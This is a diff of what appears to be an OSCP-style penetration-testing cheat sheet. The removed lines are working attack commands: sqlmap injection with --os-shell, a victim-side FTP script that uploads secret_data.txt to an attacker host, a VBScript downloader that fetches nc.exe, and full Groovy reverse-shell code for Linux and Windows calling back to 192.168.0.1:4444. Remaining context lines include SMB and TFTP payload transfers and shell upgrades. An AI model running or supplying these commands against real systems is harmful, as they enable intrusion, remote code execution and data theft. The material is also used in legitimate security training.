@@ -154,42 +154,6 @@ mount -t nfs -o soft 192.168.0.1:/backup mpt/
 
 https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md
 
-# SQLMAP
-
-DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them during your exam. You can find detailed information about tool usage in the exam guidelines.
-Get Request
-
-## Test All (Default Settings)
-
-```
-sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch
-```
-
-## Test All (Default Settings, High Stress)
-
-```
-sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
-```
-
-## Post Request (Capture with BURP)
-### Test All (Default Settings)
-
-```
-sqlmap --all -r post_request.txt --batch 
-```
-
-### Test All (Default Settings, High Stress)
-
-```
-sqlmap --all -r post_request.txt --batch --level=5 --risk=3
-```
-
-### Get A Reverse Shell (MySQL)
-
-```
-sqlmap -r post_request.txt --dbms "mysql" --os-shell
-```
-
 # Brute Force
 ## Hydra
 ### HTTP Basic Authentication
@@ -270,66 +234,6 @@ net view \\192.168.0.1
 copy \\192.168.0.1\server_name\shell.exe shell.exe
 ```
 
-## PureFTP
-### Install
-
-```
-apt-get update && apt-get install pure-ftpd
-```
-
-### Create setupftp.sh Execute The Script
-
-```
-#!/bin/bash
-groupadd ftpgroup
-useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-pure-pw useradd myftpuser -u ftpuser -d /ftphome
-pure-pw mkdb
-cd /etc/pure-ftpd/auth/
-sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
-mkdir -p /ftphome
-chown -R ftpuser:ftpgroup /ftphome/
-/etc/init.d/pure-ftpd restart
-```
-
-./setupftp.sh
-
-### Get Service Ready
-### Reset Password
-
-```
-pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd
-```
-
-### Commit Changes
-
-```
-pure-pw mkdb
-```
-
-### Restart Service
-
-```
-/etc/init.d/pure-ftpd restart 
-```
-
-### Create FTP Script (On Victim)
-
-```
-echo open 192.168.0.1>> ftp.txt
-echo USER myftpuser>> ftp.txt
-echo mypassword>> ftp.txt
-echo bin>> ftp.txt
-echo put secret_data.txt>> ftp.txt
-echo bye >> ftp.txt
-```
-
-### Execute Script (on Victim)
-
-```
-ftp -v -n -s:ftp.txt
-```
-
 ## Netcat
 ### Receiving file
 
@@ -356,56 +260,12 @@ atftpd --daemon --port 69 /var/tftp
 tftp -i 192.168.0.1 GET whoami.exe
 ```
 
-## VBScript
-### Create wget.vbs File
-
-```
-echo strUrl = WScript.Arguments.Item(0) > wget.vbs
-echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
-echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
-echo Err.Clear >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
-echo http.Open "GET",strURL,False >> wget.vbs
-echo http.Send >> wget.vbs
-echo varByteArray = http.ResponseBody >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
-echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
-echo strData = "" >> wget.vbs
-echo strBuffer = "" >> wget.vbs
-echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
-echo Next >> wget.vbs
-echo ts.Close >> wget.vbs
-```
-
-### Download Files
-
-```
-cscript wget.vbs http://192.168.0.1/nc.exe nc.exe
-```
-
 # Shells
 ## Upgrade Your Shell (TTY Shell)
 
 ```
 python -c 'import pty;pty.spawn("/bin/bash");' 
 ```
-
-## Enable Tab-Completion
-
-    In your active shell press bg to send your nc session to background
-    Enter stty raw -echo
-    Enter fg to bring your nc session to foreground
-    Enter export TERM=xterm-256color
 
 ## Catching Reverse Shells (Netcat)
 
@@ -657,25 +517,6 @@ Response.write(o)
 %>
 ```
 
-# Jenkins / Groovy (Java)
-## Linux Reverse Shell
-
-```
-String host="192.168.0.1";
-int port=4444;
-String cmd="/bin/sh";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-```
-
-## Windows Reverse Shell
-
-```
-String host="192.168.0.1";
-int port=4444;
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-```
-
 # Perl
 ## Reverse Shell
 
@@ -741,22 +582,5 @@ subfinder -d "$URL"
 
 ```
 echo "$URL" | waybackurls| httpx-pd -silent > link.txt
-```
-
-                             Shell Stabilize                          
-======================================================================
-
-```
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
-OR
-```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
-export TERM=xterm-256color
-alias ll='ls -lsaht --color=auto'
-Ctrl + Z [Background Process]
-stty raw -echo ; fg ; reset
-stty columns 200 rows 200
 ```
 
